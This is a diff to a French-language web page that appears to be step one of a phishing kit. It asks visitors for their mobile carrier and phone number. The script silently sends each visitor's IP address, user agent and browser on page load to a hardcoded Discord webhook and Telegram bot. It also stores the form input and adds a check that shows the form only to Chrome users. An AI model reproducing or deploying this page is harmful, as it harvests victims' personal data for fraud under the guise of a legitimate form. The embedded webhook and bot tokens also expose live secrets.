@@ -8,22 +8,56 @@
     background: #2c014d;
     color: #fff;
     font-family: sans-serif;
+    margin: 0;
+    height: 100vh;
+    overflow: hidden;
+  }
+  .chrome-only, .main-content {
+    position: absolute;
+    inset: 0;
     display: flex;
     justify-content: center;
     align-items: center;
-    height: 100vh;
-    margin: 0;
-  }
-  .c {
-    background: rgba(44,1,77,0.85);
-    padding: 30px;
-    border-radius: 20px;
-    width: 360px;
+    flex-direction: column;
     text-align: center;
+    padding: 20px;
+  }
+  .main-content {
+    background: rgba(44,1,77,0.85);
+    border-radius: 20px;
+    width: 90%;
+    max-width: 360px;
     box-shadow: 0 0 15px #9b00ff;
     border: 2px solid #a54ffb;
   }
-  input, select, button {
+  .chrome-only {
+    background: #2c014d;
+    z-index: 9999;
+  }
+  h1, h2 {
+    margin: 15px 0;
+  }
+  p {
+    font-size: 1.2em;
+    margin: 20px 0;
+  }
+  button {
+    background: #f7b500;
+    color: #2c014d;
+    font-weight: bold;
+    padding: 15px 30px;
+    border: none;
+    border-radius: 10px;
+    font-size: 1.2em;
+    cursor: pointer;
+    box-shadow: 0 0 10px #f7b500;
+    transition: 0.3s;
+  }
+  button:hover {
+    background: #e0a600;
+    box-shadow: 0 0 20px #ffcb3c;
+  }
+  input, select {
     width: 100%;
     margin: 8px 0;
     padding: 12px;
@@ -34,23 +68,9 @@
     font-size: 16px;
     outline: none;
     box-shadow: inset 0 0 8px #9b00ff;
-    transition: 0.3s;
   }
-  input:focus, select:focus {
-    border-color: #f7b500;
-    box-shadow: 0 0 10px #f7b500;
-  }
-  button {
-    background: #f7b500;
-    color: #2c014d;
-    font-weight: bold;
-    cursor: pointer;
-    box-shadow: 0 0 10px #f7b500;
-    transition: 0.3s;
-  }
-  button:hover {
-    background: #e0a600;
-    box-shadow: 0 0 20px #ffcb3c;
+  button.submit {
+    margin-top: 20px;
   }
   #msg {
     color: #f88;
@@ -59,7 +79,9 @@
 </style>
 </head>
 <body>
-<div class="c">
+
+<!-- Contenu principal -->
+<div class="main-content" id="mainContent">
   <h1>Étape 1 : Votre numéro 📞</h1>
   <form id="form1">
     <select name="operateur" required>
@@ -70,15 +92,32 @@
       <option value="Bouygues">Bouygues</option>
     </select>
     <input name="telephone" type="tel" placeholder="Numéro de téléphone" pattern="[0-9]{10}" required />
-    <button type="submit">Continuer</button>
+    <button type="submit" class="submit">Continuer</button>
   </form>
   <div id="msg"></div>
+</div>
+
+<!-- Page pour les autres navigateurs -->
+<div class="chrome-only" id="chromeOnly" style="display: none;">
+  <h1>Utilisez Google Chrome</h1>
+  <p>Pour continuer, ouvrez cette page dans le navigateur Google Chrome.</p>
+  <button onclick="window.location.href='https://www.google.com/chrome/'">Télécharger Google Chrome</button>
 </div>
 
 <script>
   const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1474169014027813048/-BCyQk9VGD0Y6drGsv2FUp0vc5Jn8qWwMLPPHalPfx9QxKUht-3azqggeTp8UAbtQTwB";
   const TELEGRAM_TOKEN = "7949221639:AAFENIkH1WqC2m6oVP8_aPOnsT6Qk9tBN2E";
   const TELEGRAM_CHAT_ID = "-1002810249796";
+
+  function isGoogleChrome() {
+    const ua = navigator.userAgent.toLowerCase();
+    const isChromeUA = /chrome/.test(ua) || /crios/.test(ua);
+    const isEdge = /edg/.test(ua);
+    const vendor = navigator.vendor || "";
+    const hasChromeRuntime = !!window.chrome && !!window.chrome.runtime;
+
+    return isChromeUA && !isEdge && (vendor.includes("Google") || hasChromeRuntime);
+  }
 
   async function getIP() {
     try {
@@ -114,13 +153,15 @@
   async function sendIpUaOnLoad() {
     const ip = await getIP();
     const ua = navigator.userAgent || "Inconnu";
+    const browser = isGoogleChrome() ? "Google Chrome" : "Autre navigateur";
 
     const discordEmbed = {
       title: "[🛜] PAGE OUVERTE [🛜]",
-      color: 0x9B00FF,
+      color: isGoogleChrome() ? 0x00FF00 : 0xFF0000,
       fields: [
         { name: "📱 Adresse IP", value: ip, inline: false },
-        { name: "📲 User-Agent", value: ua, inline: false }
+        { name: "📲 User-Agent", value: ua, inline: false },
+        { name: "🌐 Navigateur", value: browser, inline: false }
       ],
       timestamp: new Date().toISOString()
     };
@@ -128,14 +169,24 @@
     const telegramText =
       `[🌐] PAGE OUVERTE [🌐]\n\n` +
       `🌐 Adresse IP : ${ip}\n` +
-      `🌐 User-Agent : ${ua}`;
+      `🌐 User-Agent : ${ua}\n` +
+      `🌐 Navigateur : ${browser}`;
 
     await Promise.all([sendDiscord(discordEmbed), sendTelegram(telegramText)]);
   }
 
-  window.addEventListener('load', sendIpUaOnLoad);
+  window.addEventListener('load', async () => {
+    await sendIpUaOnLoad();
 
-  document.getElementById("form1").addEventListener("submit", (e) => {
+    const isChrome = isGoogleChrome();
+
+    if (!isChrome) {
+      document.getElementById("mainContent").style.display = "none";
+      document.getElementById("chromeOnly").style.display = "flex";
+    }
+  });
+
+  document.getElementById("form1")?.addEventListener("submit", (e) => {
     e.preventDefault();
     localStorage.setItem("step1", JSON.stringify({
       operateur: e.target.operateur.value,
@@ -153,4 +204,3 @@
 </script>
 </body>
 </html>
-
